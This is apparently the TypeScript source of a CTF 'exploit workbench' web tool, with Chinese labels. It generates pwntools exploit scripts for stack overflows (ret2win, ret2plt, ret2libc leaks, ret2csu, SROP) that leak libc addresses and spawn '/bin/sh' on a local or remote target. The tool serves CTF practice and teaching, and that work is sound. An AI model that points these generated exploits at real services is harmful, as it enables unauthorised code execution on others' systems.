// EXP workbench. Adapted from the local ROP notes; all addresses remain target-specific.
type ExpKind = "win" | "plt" | "libc-puts" | "libc-write" | "csu" | "srop";
interface ExpField {
  key: string;
  label: string;
  value: string;
  hint: string;
  placeholder?: string;
  options?: [string, string][];
}
interface ExpRecipe {
  title: string;
  caption: string;
  condition: string;
  source: string;
  example: string;
  slots: string[];
  fields: ExpField[];
  amd64Only?: boolean;
}
type ExpValues = Record<string, string>;
const EXP_RECIPES: Record<ExpKind, ExpRecipe> = {
  win: {
    title: "ret2win", caption: "已有目标函数", source: "ret2text · advanced/07",
    condition: "能覆盖返回地址，存在 win / shell / backdoor；Canary 应先处理，PIE 需已知本次基址。",
    example: "void win(void) {\n    system(\"/bin/sh\");\n}\n\nvoid vuln(void) {\n    char buf[32];\n    read(0, buf, 256);\n}\n// buf[32] 不等于 offset=32；偏移用 cyclic + GDB 实测。",
    slots: ["padding", "ret（可选）", "目标函数", "返回入口"],
    fields: [
      {key:"target",label:"目标函数名",value:"win",hint:"对应 elf.sym，例如 win / shell / backdoor。"},
      {key:"arguments",label:"函数参数",value:"",hint:"无参数留空；整数以逗号分隔。amd64 自动找传参 gadget。",placeholder:"如 0xdeadbeef, 0xcafebabe"},
      {key:"reentry",label:"函数返回后去哪里",value:"main",hint:"选择仍可继续执行的函数，例如 main；需确认返回路径。"}
    ]
  },
  plt: {
    title: "ret2plt", caption: "调用现有 system", source: "ret2text §1.3 · i386 cdecl",
    condition: "程序导入 system，且目标内存已有命令字符串。amd64 需要相应传参 gadget；i386 使用 cdecl。",
    example: "void init(void) {\n    system(\"echo ready\");  // 使 system 出现在导入表\n}\n\nvoid vuln(void) {\n    char buf[32];\n    gets(buf);\n}\n// 仍需在 ELF 中找到或另行准备以 NUL 结尾的命令字符串。",
    slots: ["padding", "传参 gadget / cdecl", "system@plt", "返回入口"],
    fields: [
      {key:"reentry",label:"返回入口函数",value:"main",hint:"system 返回后的继续执行位置。"},
      {key:"command",label:"命令字符串",value:"/bin/sh",hint:"脚本在 ELF 中搜索该字符串与结尾 NUL。"},
      {key:"stringAddress",label:"字符串地址（可选）",value:"",hint:"若字符串由前一阶段写入，填写已确认的运行时地址。",placeholder:"留空：从 ELF 搜索"}
    ]
  },
  "libc-puts": {
    title: "ret2libc / puts", caption: "字符串泄漏 · 两阶段", source: "ret2libc详解 · scripts/04",
    condition: "可调用 puts@plt，目标 GOT 表项已解析，泄漏后能回到输入点；必须确认输出边界。",
    example: "int main(void) {\n    char buf[32];\n    puts(\"Input:\");\n    read(0, buf, 256);\n    return 0;\n}\n// 第一段 puts(puts@got) → main\n// 收到泄漏后，第二段 system(\"/bin/sh\")。",
    slots: ["泄漏 GOT", "回到入口", "计算 libc 基址", "system + /bin/sh"],
    fields: [
      {key:"libc",label:"libc 文件",value:"./libc.so.6",hint:"必须与目标运行时版本匹配；选择文件路径不会自动替换本地 libc。"},
      {key:"leakSymbol",label:"要泄漏的 GOT 符号",value:"puts",hint:"须已被解析；由泄漏值减去同名 libc 符号偏移。"},
      {key:"reentry",label:"第二次输入入口",value:"main",hint:"泄漏后返回这里，再按提示发送第二段。"},
      {key:"leakPrefix",label:"泄漏前固定输出",value:"",hint:"例如程序先输出 Goodbye\\n；没有则留空。支持转义。"},
      {key:"leakEnd",label:"泄漏结束标记",value:"\\n",hint:"默认 puts 追加的换行；地址本身含该分隔符时应换 write 定长泄漏。"},
      {key:"leakBytes",label:"有效泄漏字节数",value:"",hint:"默认 amd64 为 6，i386 为 4。短读或长度不符会停止，不静默算基址。",placeholder:"按实际输出确认"}
    ]
  },
  "libc-write": {
    title: "ret2libc / write", caption: "定长泄漏 · 两阶段", source: "ret2libc §2.2 / §2.3 · advanced/15",
    condition: "可调用 write@plt 并设置三个参数；GOT 表项已解析，存在可再次输入的返回入口。",
    example: "int main(void) {\n    char buf[32];\n    write(1, \"Input:\", 6);\n    read(0, buf, 256);\n    return 0;\n}\n// write(1, write@got, sizeof(void *)) → main\n// 完整接收 8 / 4 字节后计算 libc 基址。",
    slots: ["write(1, GOT, 指针宽度)", "回到入口", "计算 libc 基址", "system + /bin/sh"],
    fields: [
      {key:"libc",label:"libc 文件",value:"./libc.so.6",hint:"按目标配套版本计算符号偏移。"},
      {key:"leakSymbol",label:"要泄漏的 GOT 符号",value:"write",hint:"须已解析；可与输出函数 write 不同。"},
      {key:"reentry",label:"第二次输入入口",value:"main",hint:"例如 main / vuln。"},
      {key:"leakPrefix",label:"泄漏前固定输出",value:"",hint:"只填写泄漏前一定会出现的字节；不依赖 strip() 猜边界。"}
    ]
  },
  csu: {
    title: "ret2csu", caption: "三参数间接调用", source: "ret2csu · advanced/08",
    condition: "只适用于对应的 CSU 指令序列。第一参数经过 edi，只保留低 32 位；此脚本生成一次调用并返回入口。",
    example: "pop rbx; pop rbp; pop r12\npop r13; pop r14; pop r15; ret\n\n// 必须与所选布局一致，例如：\nmov rdx, r13\nmov rsi, r14\nmov edi, r15d\ncall [r12 + rbx*8]\n// 循环一次；add rsp,8 + 六个 pop + ret",
    slots: ["pop 段 / rbx=0, rbp=1", "目标 GOT 与 3 参数", "call 段", "7 个清理槽 + 返回入口"],
    amd64Only:true,
    fields: [
      {key:"csuPop",label:"CSU pop 段地址",value:"",hint:"pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret",placeholder:"按当前 ELF 填写"},
      {key:"csuCall",label:"CSU call 段地址",value:"",hint:"必须核对 mov 的寄存器方向和清理槽数量。"},
      {key:"csuLayout",label:"CSU 参数布局",value:"reverse",hint:"按反汇编选择，不能只根据题名判断。",options:[["reverse","rdx=r13 · rsi=r14 · edi=r15d"],["forward","edi=r13d · rsi=r14 · rdx=r15"]]},
      {key:"indirectSymbol",label:"间接调用的 GOT 符号",value:"write",hint:"例如 write；GOT 中应是已解析的函数指针。"},
      {key:"arg1",label:"参数 1 / edi",value:"1",hint:"整数，范围 0 到 0xffffffff。"},
      {key:"arg2",label:"参数 2 / rsi",value:"elf.got['write']",hint:"整数或 elf.sym / elf.got / elf.plt['名称']。"},
      {key:"arg3",label:"参数 3 / rdx",value:"8",hint:"整数或 ELF 符号地址表达式。"},
      {key:"reentry",label:"调用后返回函数",value:"main",hint:"清理 7 个栈槽后返回这里。"}
    ]
  },
  srop: {
    title: "SROP", caption: "amd64 单帧 execve", source: "SROP · scripts/06（ciscn_2019_es_7 类条件）",
    condition: "需要独立 pop rax; ret 与 syscall; ret、已存在的 /bin/sh 和已知可用栈。带 leave 等副作用或需要两帧的题不适用。",
    example: "pop rax; ret       // 将 15 放入 rax\nsyscall; ret       // 触发 rt_sigreturn\n[SigreturnFrame]   // 恢复 rax/rdi/rsi/rdx/rip/rsp\n\n// frame.rax=59，frame.rdi=binsh\n// frame.rip=syscall，frame.rsp=已验证可用的栈\n// rootersctf_2019_srop 的两帧方案不适用此模板。",
    slots: ["padding", "pop rax → 15", "syscall", "SigreturnFrame"],
    amd64Only:true,
    fields: [
      {key:"popRax",label:"pop rax; ret 地址（可选）",value:"",hint:"留空时由 ROP(elf) 寻找完全匹配的 gadget。"},
      {key:"syscall",label:"syscall; ret 地址（可选）",value:"",hint:"留空自动找；填写时需确认后续没有 leave 等副作用。"},
      {key:"stringAddress",label:"/bin/sh 地址（可选）",value:"",hint:"留空从 ELF 搜索 /bin/sh\\0。"},
      {key:"stackAddress",label:"恢复后的 rsp",value:"",hint:"本次运行中已知、有效的可用栈地址，不填 0 占位。"}
    ]
  }
};
let expCurrent: ExpKind = "win";
const expDrafts: Partial<Record<ExpKind, ExpValues>> = {};
function expControl(id: string): HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement {
  return $(id) as HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement;
}
function expQuoted(value: string): string { return JSON.stringify(value); }
function expNumber(value: string, label: string, optional = false): string {
  const raw = value.trim();
  if (!raw && optional) return "None";
  if (!/^-?(?:0x[\da-f]+|\d+)$/i.test(raw)) throw new Error(label + " 请填整数或 0x 十六进制值。");
  const number = Number(raw);
  if (!Number.isSafeInteger(number) || number < 0) throw new Error(label + " 应为有效的非负整数。");
  if (optional && number === 0) throw new Error(label + " 不能用 0 作为地址占位。");
  return /^0x/i.test(raw) ? raw : String(number);
}
function expExpression(value: string, label: string): string {
  if (/^-?(?:0x[\da-f]+|\d+)$/i.test(value.trim())) {
    const raw=value.trim();
    return /^-?0x/i.test(raw) ? raw : BigInt(raw).toString();
  }
  const symbol = /^elf\.(sym|got|plt)\[['"]([A-Za-z_][\w@.]*)['"]\]$/.exec(value.trim());
  if (symbol) return "elf." + symbol[1] + "[" + expQuoted(symbol[2]) + "]";
  throw new Error(label + " 仅支持整数或 elf.sym / elf.got / elf.plt['名称']。");
}
function expSymbol(value: string, label: string): string {
  if (!/^[A-Za-z_][\w@.]*$/.test(value)) throw new Error(label + " 请填函数或符号名称。");
  return expQuoted(value);
}
function expRequired(value: string | undefined, label: string): string {
  const s=(value || "").trim();
  if(!s) throw new Error(label+"不能为空。");
  return s;
}
function expBytes(value: string): string {
  const bytes: number[] = [];
  for (let i=0; i<value.length;) {
    if (value[i] === "\\") {
      const next = value[i+1];
      const simple: Record<string,number> = {n:10,r:13,t:9,"\\":92,"0":0};
      if (next in simple) { bytes.push(simple[next]); i+=2; continue; }
      if (next === "x" && /^[\da-f]{2}$/i.test(value.slice(i+2,i+4))) {
        bytes.push(parseInt(value.slice(i+2,i+4),16)); i+=4; continue;
      }
      throw new Error("字节字符串仅支持 \\n、\\r、\\t、\\\\、\\0 和 \\xHH 转义。");
    }
    const point = value.codePointAt(i)!;
    bytes.push(...new TextEncoder().encode(String.fromCodePoint(point)));
    i += point > 0xffff ? 2 : 1;
  }
  return ropPyBytes(bytes);
}
function generateExp(kind: ExpKind, v: ExpValues): string {
  const recipe = EXP_RECIPES[kind];
  if (!recipe) throw new Error("未知的模板。");
  const arch = v.arch === "i386" ? "i386" : "amd64";
  if (recipe.amd64Only && arch !== "amd64") throw new Error("这个模板仅支持 amd64。");
  const offset = expNumber(v.offset || "", "返回地址偏移", true);
  if (offset !== "None" && Number(offset) > 1048576) throw new Error("请确认偏移；当前值超过 1 MiB。");
  const base = expNumber(v.base || "", "PIE 基址", true);
  const align1 = v.align1 === "1" ? "True" : "False";
  const align2 = v.align2 === "1" ? "True" : "False";
  const mode = v.mode === "line" || v.mode === "cstring" ? v.mode : "raw";
  const usesLibc = kind === "libc-puts" || kind === "libc-write";
  const lines = [
    "# " + recipe.title + " / " + arch + " — 按目标程序适配的独立模板",
    "# 来自本地 ROP 笔记整理；模板不代表当前 ELF 已运行验证。",
    "from pwn import *", "from pathlib import Path", "",
    "context.clear(arch=" + expQuoted(arch) + ", os='linux')",
    "context.timeout = 3",
    "BINARY = " + expQuoted(expRequired(v.binary, "题目附件路径")),
    "OFFSET = " + offset + "  # cyclic + GDB 实测，不等于局部数组大小",
    "ELF_BASE = " + base + "  # PIE 时填写当前进程已确认的基址",
    "PROMPT = " + expBytes(v.prompt || ""),
    "INPUT_MODE = " + expQuoted(mode) + "  # raw / line / cstring",
    "ALIGN_STAGE1 = " + align1,
    "ALIGN_STAGE2 = " + align2,
    "LOADER = " + expQuoted(v.loader || ""),
    "LIBC_PATH = " + expQuoted(usesLibc ? expRequired(v.libc, "libc 文件") : ""),
    "", "elf = ELF(BINARY, checksec=False)",
    "if elf.arch != " + expQuoted(arch) + ":", "    raise ValueError('架构与 ELF 不匹配')", "context.binary = elf",
    "if OFFSET is None:", "    raise ValueError('先填写 cyclic + GDB 测出的返回地址偏移')",
    "if elf.canary:", "    raise ValueError('此模板未包含 Canary 泄漏与回填，请先接入已验证的处理')",
    "if elf.pie:",
    "    if ELF_BASE is None:", "        raise ValueError('PIE 需要本次进程的已知基址；不能跨进程复用旧地址')",
    "    elf.address = ELF_BASE", ""
  ];
  if (usesLibc) lines.push("libc = ELF(LIBC_PATH, checksec=False)", "if libc.arch != elf.arch:", "    raise ValueError('libc 与 ELF 架构不匹配')", "");
  lines.push(
    "def start():", "    if args.REMOTE:",
    "        return remote(args.HOST or '127.0.0.1', int(args.PORT or 1337))",
    "    if LOADER:",
    "        if not LIBC_PATH:", "            raise ValueError('使用 loader 时一并设置匹配的 LIBC_PATH')",
    "        return process([LOADER, '--library-path', str(Path(LIBC_PATH).resolve().parent), elf.path])",
    "    return process(elf.path)", "",
    "def gadget(instructions):", "    found = ROP(elf).find_gadget(instructions)",
    "    if found is None:", "        raise ValueError('缺少 gadget: ' + '; '.join(instructions))",
    "    return found.address", "",
    "def send_payload(io, payload):",
    "    if INPUT_MODE == 'line' and b'\\n' in payload:",
    "        raise ValueError('载荷含换行，按行输入会提前终止')",
    "    if INPUT_MODE == 'cstring' and b'\\0' in payload:",
    "        raise ValueError('载荷含 NUL，strcpy 等字符串复制会截断')",
    "    if PROMPT and not io.recvuntil(PROMPT):",
    "        raise TimeoutError('未收到输入提示；请核对 PROMPT 与菜单协议')",
    "    if INPUT_MODE == 'line':", "        io.sendline(payload)",
    "    else:", "        io.send(payload)",
    "    # raw 单次读可能短读；循环定长读需按目标协议补足长度。", "",
    "def aligned_rop(enabled):", "    chain = ROP(elf)",
    "    if enabled and context.arch == 'amd64':", "        chain.raw(gadget(['ret']))",
    "    return chain", ""
  );
  if (kind === "win") {
    const target=expSymbol(expRequired(v.target,"目标函数"),"目标函数");
    const after=expSymbol(expRequired(v.reentry,"返回入口"),"返回入口");
    const argsList = (v.arguments || "").trim() ? v.arguments.split(",").map(x=>expExpression(x,"函数参数")).join(", ") : "";
    lines.push("TARGET = " + target, "TARGET_ARGS = [" + argsList + "]", "REENTRY = " + after, "",
      "def build_payload():", "    chain = aligned_rop(ALIGN_STAGE1)",
      "    chain.call(elf.sym[TARGET], TARGET_ARGS)", "    chain.raw(elf.sym[REENTRY])",
      "    log.info(chain.dump())", "    return flat(b'A' * OFFSET, chain.chain())", "",
      "def main():", "    io = start()", "    send_payload(io, build_payload())", "    io.interactive()");
  } else if (kind === "plt") {
    const after=expSymbol(expRequired(v.reentry,"返回入口"),"返回入口");
    const address=expNumber(v.stringAddress || "","字符串地址",true);
    const command=ropPyBytes(Array.from(new TextEncoder().encode(expRequired(v.command,"命令字符串") + "\0")));
    lines.push("REENTRY = " + after, "STRING_ADDRESS = " + address, "COMMAND = " + command, "",
      "def build_payload():",
      "    binsh = STRING_ADDRESS if STRING_ADDRESS is not None else next(elf.search(COMMAND), None)",
      "    if binsh is None:", "        raise ValueError('ELF 中没有指定命令字符串，请填写已知字符串地址')",
      "    chain = aligned_rop(ALIGN_STAGE1)", "    chain.call(elf.plt['system'], [binsh])",
      "    chain.raw(elf.sym[REENTRY])", "    log.info(chain.dump())",
      "    return flat(b'A' * OFFSET, chain.chain())", "",
      "def main():", "    io = start()", "    send_payload(io, build_payload())", "    io.interactive()");
  } else if (usesLibc) {
    const symbol=expSymbol(expRequired(v.leakSymbol,"泄漏符号"),"泄漏符号");
    const after=expSymbol(expRequired(v.reentry,"第二次输入入口"),"第二次输入入口");
    const leakBytes=expNumber(v.leakBytes || (arch==="amd64"?"6":"4"),"有效泄漏字节数");
    if (kind==="libc-puts" && (Number(leakBytes)<1 || Number(leakBytes)>(arch==="amd64"?8:4))) throw new Error("泄漏字节数超过指针宽度或小于 1。");
    const end=expBytes(v.leakEnd === undefined ? "\\n" : v.leakEnd);
    if (kind==="libc-puts" && end==="b''") throw new Error("puts 泄漏结束标记不能为空。");
    lines.push("LEAK_SYMBOL = " + symbol, "REENTRY = " + after,
      "LEAK_PREFIX = " + expBytes(v.leakPrefix || ""),
      "POINTER_SIZE = " + (arch==="amd64"?"8":"4"));
    if (kind==="libc-puts") lines.push("LEAK_END = " + end, "LEAK_BYTES = " + leakBytes);
    lines.push("", "def build_stage1():", "    chain = aligned_rop(ALIGN_STAGE1)");
    if (kind==="libc-puts") lines.push("    chain.call(elf.plt['puts'], [elf.got[LEAK_SYMBOL]])");
    else lines.push("    chain.call(elf.plt['write'], [1, elf.got[LEAK_SYMBOL], POINTER_SIZE])");
    lines.push("    chain.raw(elf.sym[REENTRY])", "    log.info(chain.dump())",
      "    return flat(b'A' * OFFSET, chain.chain())", "", "def receive_leak(io):",
      "    if LEAK_PREFIX and not io.recvuntil(LEAK_PREFIX):",
      "        raise TimeoutError('未收到泄漏前固定输出')");
    if (kind==="libc-puts") lines.push(
      "    packet = io.recvuntil(LEAK_END)",
      "    if not packet.endswith(LEAK_END):", "        raise TimeoutError('未收到泄漏结束标记')",
      "    raw = packet[:-len(LEAK_END)]  # 仅删除已确认的分隔符，不用 strip()",
      "    if PROMPT and LEAK_END == PROMPT:", "        io.unrecv(PROMPT)  # 下一次 send_payload 仍需消费输入提示",
      "    if len(raw) != LEAK_BYTES:", "        raise ValueError('puts 泄漏长度不符；检查 NUL、换行与输出边界，必要时改用 write')",
      "    return unpack(raw.ljust(POINTER_SIZE, b'\\0'), word_size=POINTER_SIZE * 8)"
    );
    else lines.push("    raw = io.recvn(POINTER_SIZE)", "    if len(raw) != POINTER_SIZE:",
      "        raise TimeoutError('write 泄漏未收到完整指针')",
      "    return unpack(raw, word_size=POINTER_SIZE * 8)");
    lines.push("", "def build_stage2():", "    chain = aligned_rop(ALIGN_STAGE2)",
      "    binsh = next(libc.search(b'/bin/sh\\0'))", "    chain.call(libc.sym['system'], [binsh])",
      "    chain.raw(elf.sym[REENTRY])", "    log.info(chain.dump())",
      "    return flat(b'A' * OFFSET, chain.chain())", "",
      "def main():", "    io = start()", "    send_payload(io, build_stage1())",
      "    leak = receive_leak(io)", "    base = leak - libc.sym[LEAK_SYMBOL]",
      "    if base <= 0 or base & 0xfff:", "        raise ValueError('libc 基址不合理；检查输出边界、符号是否已解析及 libc 版本')",
      "    libc.address = base",
      "    log.success('libc base = %#x' % libc.address)",
      "    send_payload(io, build_stage2())", "    io.interactive()");
  } else if (kind === "csu") {
    const pop=expNumber(v.csuPop || "","CSU pop 地址",true);
    const call=expNumber(v.csuCall || "","CSU call 地址",true);
    lines.push("CSU_POP = " + pop, "CSU_CALL = " + call,
      "INDIRECT_SYMBOL = " + expSymbol(expRequired(v.indirectSymbol,"间接调用符号"),"间接调用符号"),
      "REENTRY = " + expSymbol(expRequired(v.reentry,"返回函数"),"返回函数"),
      "CSU_LAYOUT = " + expQuoted(v.csuLayout === "forward" ? "forward" : "reverse"), "",
      "def csu_call(func_ptr, arg1, arg2, arg3, after):",
      "    if not CSU_POP or not CSU_CALL:", "        raise ValueError('填写当前 ELF 的两段 CSU 地址')",
      "    if not 0 <= arg1 <= 0xffffffff:", "        raise ValueError('edi 会截断第一参数，只能传 32 位值')",
      "    r13, r14, r15 = (arg1, arg2, arg3) if CSU_LAYOUT == 'forward' else (arg3, arg2, arg1)",
      "    # rbx=0, rbp=1：一次间接调用；其后 add rsp,8 + 六个 pop + ret",
      "    return flat(CSU_POP, 0, 1, func_ptr, r13, r14, r15, CSU_CALL, *([0] * 7), after)", "",
      "def build_payload():", "    call = csu_call(elf.got[INDIRECT_SYMBOL],",
      "                    " + expExpression(v.arg1 || "1","参数 1") + ", " + expExpression(v.arg2 || "elf.got['write']","参数 2") + ", " + expExpression(v.arg3 || "8","参数 3") + ", elf.sym[REENTRY])",
      "    prefix = flat(gadget(['ret'])) if ALIGN_STAGE1 else b''",
      "    return flat(b'A' * OFFSET, prefix, call)", "",
      "def main():", "    io = start()", "    send_payload(io, build_payload())",
      "    # 这是一次三参数调用；后续 libc 基址计算和第二阶段按目标另接。",
      "    io.interactive()");
  } else {
    lines.push("POP_RAX = " + expNumber(v.popRax || "","pop rax 地址",true),
      "SYSCALL = " + expNumber(v.syscall || "","syscall 地址",true),
      "BINSH = " + expNumber(v.stringAddress || "","/bin/sh 地址",true),
      "STACK_ADDRESS = " + expNumber(v.stackAddress || "","恢复后的 rsp",true), "",
      "def build_payload():", "    if not STACK_ADDRESS:", "        raise ValueError('先填写当前进程中已知可用的栈地址')",
      "    pop_rax = POP_RAX if POP_RAX is not None else gadget(['pop rax', 'ret'])",
      "    syscall = SYSCALL if SYSCALL is not None else gadget(['syscall', 'ret'])",
      "    binsh = BINSH if BINSH is not None else next(elf.search(b'/bin/sh\\0'), None)",
      "    if binsh is None:", "        raise ValueError('ELF 中没有 /bin/sh，请填写已知地址或换用分阶段方案')",
      "    frame = SigreturnFrame()", "    frame.rax = constants.SYS_execve", "    frame.rdi = binsh",
      "    frame.rsi = 0", "    frame.rdx = 0", "    frame.rip = syscall", "    frame.rsp = STACK_ADDRESS",
      "    # execve 成功替换进程；失败后的继续执行路径需按目标设计。",
      "    return flat(b'A' * OFFSET, pop_rax, 15, syscall, bytes(frame))", "",
      "def main():", "    io = start()", "    send_payload(io, build_payload())", "    io.interactive()");
  }
  lines.push("", "if __name__ == '__main__':", "    main()", "");
  return lines.join("\n");
}
function expValues(): ExpValues {
  const values: ExpValues = {};
  for (const key of ["binary","arch","offset","mode","prompt","base","loader","align1","align2"]) {
    values[key] = expControl("exp" + key[0].toUpperCase() + key.slice(1)).value;
  }
  EXP_RECIPES[expCurrent].fields.forEach(field=>{ values[field.key]=expControl("exp-field-"+field.key).value; });
  return values;
}
function updateExp(): void {
  const values=expValues();
  try {
    const code=generateExp(expCurrent,values);
    $("expCode").textContent=code;
    $("expMessage").textContent=values.offset ? "脚本已生成。地址、提示符和 libc 以当前题目为准。" : "先填写返回地址偏移；下方仍可预览完整结构。";
    $("expMessage").classList.remove("exp-error");
    ($("expCopy") as HTMLButtonElement).disabled=false;
    ($("expDownload") as HTMLButtonElement).disabled=false;
  } catch (error) {
    $("expCode").textContent="# 请先修正输入，再生成脚本。";
    $("expMessage").textContent=error instanceof Error ? error.message : String(error);
    $("expMessage").classList.add("exp-error");
    ($("expCopy") as HTMLButtonElement).disabled=true;
    ($("expDownload") as HTMLButtonElement).disabled=true;
  }
}
function renderExpRecipe(kind: ExpKind): void {
  if (EXP_RECIPES[expCurrent]) {
    const draft: ExpValues={};
    EXP_RECIPES[expCurrent].fields.forEach(f=>{
      const control=document.getElementById("exp-field-"+f.key) as HTMLInputElement | HTMLSelectElement | null;
      if (control) draft[f.key]=control.value;
    });
    expDrafts[expCurrent]=draft;
  }
  expCurrent=kind;
  const recipe=EXP_RECIPES[kind];
  const arch=expControl("expArch") as HTMLSelectElement;
  if (recipe.amd64Only) arch.value="amd64";
  arch.disabled=!!recipe.amd64Only;
  $("expCondition").textContent=recipe.condition;
  $("expSource").textContent="笔记依据：" + recipe.source;
  $("expExample").textContent=recipe.example;
  $("expStack").innerHTML=recipe.slots.map((slot,i)=>'<span><small>'+String(i+1).padStart(2,"0")+'</small>'+ropEscapeHtml(slot)+'</span>').join("");
  $("expFields").innerHTML=recipe.fields.map(field=>{
    const id="exp-field-"+field.key;
    const control=field.options
      ? '<select id="'+id+'">'+field.options.map(pair=>'<option value="'+pair[0]+'">'+ropEscapeHtml(pair[1])+'</option>').join("")+'</select>'
      : '<input type="text" id="'+id+'" autocomplete="off" spellcheck="false" placeholder="'+ropEscapeHtml(field.placeholder || "")+'">';
    return '<div class="exp-field"><label class="flabel" for="'+id+'">'+ropEscapeHtml(field.label)+'</label>'+control+'<p class="field-help">'+ropEscapeHtml(field.hint)+'</p></div>';
  }).join("");
  recipe.fields.forEach(field=>{ expControl("exp-field-"+field.key).value=expDrafts[kind]?.[field.key] ?? field.value; });
  document.querySelectorAll<HTMLButtonElement>("[data-exp-template]").forEach(button=>{
    const selected=button.dataset.expTemplate===kind;
    button.classList.toggle("on",selected);
    button.setAttribute("aria-pressed",String(selected));
  });
  $("expFields").querySelectorAll<HTMLInputElement | HTMLSelectElement>("input, select").forEach(field=>field.addEventListener("input",updateExp));
  updateExp();
}
function expAnalyzeSource(source: string): {kind: ExpKind | null; calls: string[]; note: string; target?: string} {
  const calls=["gets","read","scanf","puts","write","system","execve"].filter(name=>new RegExp("\\b"+name+"\\s*\\(").test(source));
  const namedWin=/\b(?:void|int|long|__int64)\s+(?:__\w+\s+)?(win|shell|backdoor)\s*\(/.exec(source);
  const kind: ExpKind | null=namedWin ? "win" : calls.includes("system") ? "plt" : calls.includes("write") ? "libc-write" : calls.includes("puts") ? "libc-puts" : null;
  return {kind,calls,target:namedWin?.[1],note:"只按文本识别调用线索；不判断漏洞是否可利用，也不从数组大小推算 offset。"};
}
interface ElfProfile {
  binary: string;
  arch: "amd64" | "i386";
  sha256: string;
  security: {pie: boolean; canary: boolean; nx: boolean | null; relro: string | null};
  functions: string[];
  plt: string[];
  got: string[];
}
function parseElfProfile(text: string): ElfProfile {
  if (text.length > 200000) throw new Error("检查结果超过 200 KB，请确认粘贴的是检查工具输出。");
  const data: unknown=JSON.parse(text);
  if (!data || typeof data !== "object") throw new Error("检查结果应为 JSON 对象。");
  const p=data as Record<string,unknown>;
  if (p.format !== "pwnworkbench.elf.v1" || !["amd64","i386"].includes(String(p.arch))) throw new Error("不支持的检查结果格式或架构。");
  if (typeof p.binary !== "string" || !/^\.\/[^/\\\x00-\x1f]+$/.test(p.binary)) throw new Error("附件路径应为 ./文件名。");
  if (typeof p.sha256 !== "string" || !/^[a-f0-9]{64}$/.test(p.sha256)) throw new Error("缺少有效的附件 SHA-256。");
  for (const key of ["functions","plt","got"]) {
    const list=p[key];
    if (!Array.isArray(list) || list.length>4096 || !list.every(x=>typeof x === "string" && x.length<=512)) throw new Error("符号列表格式不正确。");
  }
  if (!p.security || typeof p.security !== "object") throw new Error("缺少保护信息。");
  const s=p.security as Record<string,unknown>;
  if (typeof s.pie!=="boolean" || typeof s.canary!=="boolean" || (s.nx!==null && typeof s.nx!=="boolean") || ![null,"Full","Partial"].includes(s.relro as string | null)) throw new Error("保护信息格式不正确。");
  return p as unknown as ElfProfile;
}
function applyElfProfile(profile: ElfProfile): void {
  Object.keys(expDrafts).forEach(key=>delete expDrafts[key as ExpKind]);
  $("expFields").innerHTML="";
  for (const key of ["offset","base","prompt","loader"]) expControl("exp"+key[0].toUpperCase()+key.slice(1)).value="";
  expControl("expMode").value="raw";
  expControl("expAlign1").value=expControl("expAlign2").value="0";
  expControl("expBinary").value=profile.binary;
  expControl("expArch").value=profile.arch;
  expControl("expSourceInput").value="";
  $("expAnalysis").textContent="";
  renderExpRecipe("win");
  const target=["win","shell","backdoor"].find(name=>profile.functions.includes(name));
  expControl("exp-field-target").value=target || "win";
  updateExp();
  const s=profile.security;
  $("expProfileStatus").textContent=profile.binary+" · "+profile.arch+" · PIE "+(s.pie?"开":"关")+" / Canary "+(s.canary?"检出":"未检出")+" / NX "+(s.nx===null?"未知":s.nx?"开":"关")+" / RELRO "+(s.relro || "无")+"。PLT："+(profile.plt.slice(0,20).join(", ") || "未识别")+"。"+(target?"已填入符号 "+target+"，请核对函数作用。":"未识别 win 类符号，请自行选模板和填写目标函数。")+" SHA-256："+profile.sha256;
}
function initExpWorkbench(): void {
  if (!["amd64","i386"].includes(expControl("expArch").value)) expControl("expArch").value="amd64";
  if (!expControl("expMode").value) expControl("expMode").value="raw";
  // First render should use the schema defaults rather than save empty draft fields.
  delete expDrafts.win;
  const first=EXP_RECIPES.win;
  $("expFields").innerHTML="";
  expCurrent="win";
  renderExpRecipe("win");
  first.fields.forEach(field=>{ expControl("exp-field-"+field.key).value=field.value; });
  updateExp();
  document.querySelectorAll<HTMLButtonElement>("[data-exp-template]").forEach(button=>{
    button.addEventListener("click",()=>renderExpRecipe(button.dataset.expTemplate as ExpKind));
  });
  $("expCommon").querySelectorAll<HTMLInputElement | HTMLSelectElement>("input, select").forEach(field=>field.addEventListener("input",updateExp));
  $("expCopy").addEventListener("click",()=>copyText($("expCode").textContent || "","已复制完整 EXP"));
  $("expDownload").addEventListener("click",()=>{
    const blob=new Blob([$("expCode").textContent || ""],{type:"text/x-python;charset=utf-8"});
    const url=URL.createObjectURL(blob);
    const link=document.createElement("a");
    link.href=url;link.download="exploit_"+expCurrent.replace("-","_")+".py";
    document.body.appendChild(link);link.click();link.remove();
    setTimeout(()=>URL.revokeObjectURL(url),1000);
  });
  $("expTryExample").addEventListener("click",()=>{ expControl("expSourceInput").value=EXP_RECIPES[expCurrent].example; });
  $("expAnalyze").addEventListener("click",()=>{
    const source=expControl("expSourceInput").value;
    const result=expAnalyzeSource(source);
    $("expAnalysis").textContent=(result.calls.length ? "识别到："+result.calls.join(" / ")+"。" : "没有识别到常见调用。")+" "+result.note;
    if (result.kind) {
      renderExpRecipe(result.kind);
      if (result.target) { expControl("exp-field-target").value=result.target; updateExp(); }
      $("expAnalysis").textContent+=" 已选择 "+EXP_RECIPES[result.kind].title+"，请核对适用条件。";
    }
    if (result.calls.includes("gets")) {expControl("expMode").value="line";updateExp();}
  });
  $("expProfileApply").addEventListener("click",()=>{
    try { applyElfProfile(parseElfProfile(expControl("expProfileInput").value)); }
    catch (error) { $("expProfileStatus").textContent=error instanceof Error ? error.message : String(error); }
  });
}
